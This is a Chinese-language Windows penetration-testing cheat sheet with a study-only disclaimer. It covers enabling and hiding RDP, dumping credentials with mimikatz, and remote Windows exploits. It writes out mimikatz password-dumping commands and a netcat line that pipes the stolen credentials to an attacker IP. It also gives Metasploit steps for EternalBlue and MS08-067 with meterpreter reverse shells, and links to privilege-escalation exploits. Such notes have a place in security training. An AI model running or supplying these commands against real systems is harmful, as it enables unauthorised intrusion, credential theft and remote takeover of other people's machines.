# windows 渗透笔记

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

# RDP

**cmd 开 RDP**
- 文章
    - [开启 RDP](https://b404.xyz/2017/12/27/open-RDP/)

- 命令
    - **dos 命令开启 3389 端口(开启 XP&2003 终端服务)**
        1. 方法一:`REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f`

        2. 方法二:`REG add HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /d 0 /t REG_DWORD /f`

    - **WMIC 开启 3389**

         `wmic /namespace:\\root\CIMV2\TerminalServices PATH Win32_TerminalServiceSetting WHERE (__CLASS !="") CALL SetAllowTSConnections 1`

    - **PowerShell 开启 RDP**
        1. Enable RDP
        `set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0`

        2. Allow RDP in firewall
        `Set-NetFirewallRule -Name RemoteDesktop-UserMode-In-TCP -Enabled true`

        3. Enable secure RDP authentication
        `set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1`

        或

        1. Enable Remote Desktop
        `(Get-WmiObject Win32_TerminalServiceSetting -Namespace root\cimv2\TerminalServices).SetAllowTsConnections(1,1) `
        `(Get-WmiObject -Class "Win32_TSGeneralSetting" -Namespace root\cimv2\TerminalServices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) `

        2. Enable the firewall rule
        `Enable-NetFirewallRule -DisplayGroup "Remote Desktop"`

    - **查看 3389 端口是否开启**

        `REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /*如果是0x0则开启`

    - **更改终端端口为 2008(十六进制为:0x7d8)**

        1. `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x7d8 /f`
        2. `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 0x7D8 /f`

    - **查看 3389 端口是否更改**

        `REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber  /*出来的结果是 16 进制`

    - **取消 xp&2003 系统防火墙对终端服务的限制及 IP 连接的限制:**

        `REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled :@ xpsp2res.dll,-22009 /f`

**第三方连接工具**
- [rdesktop/rdesktop](https://github.com/rdesktop/rdesktop)
- [Remmina](https://remmina.org/)
- [FreeRDP/FreeRDP](https://github.com/FreeRDP/FreeRDP)

**多开**
- 文章
    - [Win7 双开 3389](https://blog.csdn.net/SysProgram/article/details/11810889)
    - [渗透技巧——Windows 系统远程桌面的多用户登录](https://www.4hou.com/system/8314.html)
    - [Multi-User login in Windows 7/Vista/XP using Remote Desktop](http://zahirkhan.com/tools-utilities/multi-user-login-in-windows-7)

- 工具
    - [stascorp/rdpwrap](https://github.com/stascorp/rdpwrap)

- mimikatz
    ```
    privilege::debug
    ts::multirdp
    ```

- Windows Server
    ```
    win+R
    gpedit.msc
    计算机配置->管理模板->Windows 组件->远程桌面服务->远程桌面会话主机->连接
    将 "将远程桌面服务的用户限制到单独的远程桌面会话" 禁用
    ```

**连接记录**
- 文章
    - [渗透技巧——获得 Windows 系统的远程桌面连接历史记录](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%BE%97Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/)
    - [关于 windows 的 RDP 连接记录](http://rcoil.me/2018/05/%E5%85%B3%E4%BA%8Ewindows%E7%9A%84RDP%E8%BF%9E%E6%8E%A5%E8%AE%B0%E5%BD%95/)
    - [How to Clear RDP Connections History in Windows](http://woshub.com/how-to-clear-rdp-connections-history/#h2_3)

- 工具
    - [3gstudent/List-RDP-Connections-History](https://github.com/3gstudent/List-RDP-Connections-History)

---

# 口令获取及破解

**工具**
- **mimikatz**
    - 文章
        - [九种姿势运行 Mimikatz](https://www.freebuf.com/articles/web/176796.html)
        - [Mimikatz 使用小技巧](https://www.webshell.cc/5343.html)

    提权

    `privilege::debug`

    抓取密码

    `sekurlsa::logonpasswords`

    输出
    ```shell
    mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit && dir # 记录 Mimikatz 输出
    mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> log.txt # 输出到 log.txt
    ```

    输出传输到远程机器
    ```shell
    # Attacker 执行
    nc -lvp 4444

    # Victim 执行
    mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit | nc.exe -vv 192.168.1.1 4444
    # 192.168.1.1 为Attacker IP
    ```

    通过 nc 远程执行
    ```shell
    # Victim 执行
    nc -lvp 443

    # Attacker 执行
    nc.exe -vv 192.168.1.2 443 -e mimikatz.exe
    # 192.168.1.2 为 Victim IP
    ```

    若管理员有每过几天就改密码的习惯,但是 mimikatz 抓取到的密码都是老密码,用 QuarksPwDump 等抓的 hash 也是老 hash,新密码却抓不到的情况下
    ```
    privilege::debug
    misc::memssp
    ```
    记录的结果在 `c:/windows/system32/mimilsa.log`

- [skelsec/pypykatz](https://github.com/skelsec/pypykatz) - 用纯 Python 实现的 Mimikatz

- [AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne) - 抓密码神器

- [Arvanaghi/SessionGopher](https://github.com/Arvanaghi/SessionGopher) - 使用 WMI 提取 WinSCP、PuTTY、SuperPuTTY、FileZilla 和 Microsoft remote Desktop 等远程访问工具保存的会话信息的 ps 脚本

- **[Invoke-WCMDump](https://github.com/peewpw/Invoke-WCMDump)**
    ```
    set-executionpolicy remotesigned
    import-module .\Invoke-WCMDump.ps1
    invoke-wcmdump
    ```

- [SterJo Key Finder](https://www.sterjosoft.com/key-finder.html) - 找出系统中软件的序列号

---

# 漏洞利用
**资源**
- [SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits) - Windows 平台提权漏洞集合
- [WindowsExploits/Exploits](https://github.com/WindowsExploits/Exploits)- Windows Exploits

---

## 漏洞查询
**文章**
- [windows 本地提权对照表](http://www.7kb.org/138.html)

**文件**
- [BulletinSearch-微软官网提供的漏洞 excel 列表](http://download.microsoft.com/download/6/7/3/673E4349-1CA5-40B9-8879-095C72D5B49D/BulletinSearch.xlsx)

**工具**
- [GDSSecurity/Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester) - 此工具将目标修补程序级别与 Microsoft 漏洞数据库进行比较,以便检测目标上可能缺少的修补程序.
- [bitsadmin/wesng](https://github.com/bitsadmin/wesng) - Windows Exploit Suggester
- [tengzhangchao/microsoftSpider](https://github.com/tengzhangchao/microsoftSpider) - 爬取微软漏洞信息,MS 对应的每个版本操作系统 KB 号以及补丁下载地址.
- [提权辅助网页](https://bugs.hacking8.com/tiquan/)
- [Windows提权EXP在线搜索工具](http://blog.neargle.com/win-powerup-exp-index/)

---

## 提权
**CVE-2018-8120**
- POC | Payload | exp
    - [unamer/CVE-2018-8120: CVE-2018-8120 Windows LPE exploit](https://github.com/unamer/CVE-2018-8120)
    - [alpha1ab/CVE-2018-8120: CVE-2018-8120 Exploit for Win2003 Win2008 WinXP Win7](https://github.com/alpha1ab/CVE-2018-8120)

**CVE-2019-1388**
- 文章
    - [最新Windows 7安全桌面提权漏洞风险提示与过程披露](https://mp.weixin.qq.com/s/V8GyBxda-JXyv-5D6bR36g)
    - [Thanksgiving Treat: Easy-as-Pie Windows 7 Secure Desktop Escalation of Privilege](https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege)

---

## 远程
**MS08-067 & CVE-2008-4250**
- MSF 模块
    ```bash
    use exploit/windows/smb/ms08_067_netapi
    set payload windows/x64/meterpreter/reverse_tcp
    set target 0
    ```

**MS12-020 & CVE-2012-0002**
- MSF 模块
    ```bash
    use auxiliary/scanner/rdp/ms12_020_check
    use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
    ```

**MS14-066 & CVE-2014-6321**
- POC | Payload | exp
    - [anexia-it/winshock-test](https://github.com/anexia-it/winshock-test)

**MS15-034 & CVE-2015-1635**
- POC | Payload | exp
    - [MS15-034 Checker](https://pastebin.com/ypURDPc4)

- 文章
    - [MS15-034/CVE-2015-1635 HTTP远程代码执行漏洞分析](http://blogs.360.cn/post/cve_2015_6135_http_rce_analysis.html)

- MSF 模块
    ```bash
    use auxiliary/scanner/http/ms15_034_http_sys_memory_dump    # 读取服务器内存数据
    use auxiliary/dos/http/ms15_034_ulonglongadd    # 进行 dos 攻击
    ```

**MS17-010**
- MSF 模块
    ```bash
    # 发现,检测
    use auxiliary/scanner/smb/smb_ms17_010
    set rhosts <ip>
    run

    # 使用 payload 连上去
    use exploit/windows/smb/ms17_010_eternalblue
    set payload windows/x64/meterpreter/reverse_tcp
    set lhost <ip>  # 设一下本机地址
    set rhosts <ip>
    run

    # msf 下加载 mimikatz 模块
    load mimikatz
    kerberos
    ```

- 修复工具
    - ["永恒之蓝"勒索蠕虫漏洞修复工具](https://www.qianxin.com/other/wannacryfix)

**bluekeep & CVE-2019-0708**
- 文章
    - [RDP Stands for "Really DO Patch!" – Understanding the Wormable RDP Vulnerability CVE-2019-0708](https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/rdp-stands-for-really-do-patch-understanding-the-wormable-rdp-vulnerability-cve-2019-0708/)
    - [worawit/CVE-2019-0708](https://github.com/worawit/CVE-2019-0708/blob/master/NOTE.md)

- POC | Payload | exp
    - [zerosum0x0/CVE-2019-0708](https://github.com/zerosum0x0/CVE-2019-0708)
    - [robertdavidgraham/rdpscan](https://github.com/robertdavidgraham/rdpscan)
    - [Ekultek/BlueKeep](https://github.com/Ekultek/BlueKeep)
    - [mekhalleh/cve-2019-0708](https://github.com/mekhalleh/cve-2019-0708) (实测、蓝屏)
    - [Cyb0r9/ispy](https://github.com/Cyb0r9/ispy)
    - [k8gege/CVE-2019-0708](https://github.com/k8gege/CVE-2019-0708) - 批量检测工具

- 修复工具
    - ["CVE-2019-0708"漏洞检测修复工具](https://www.qianxin.com/other/CVE-2019-0708)

- MSF 模块
    ```bash
    # 发现,检测
    use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
    set rhosts <ip>
    run
    ```

---

## 其他
**CVE-2018-8420 Msxml 解析器的远程代码执行漏洞**
- POC | Payload | exp
    - [Lz1y/CVE-2018-8420](https://github.com/Lz1y/CVE-2018-8420)
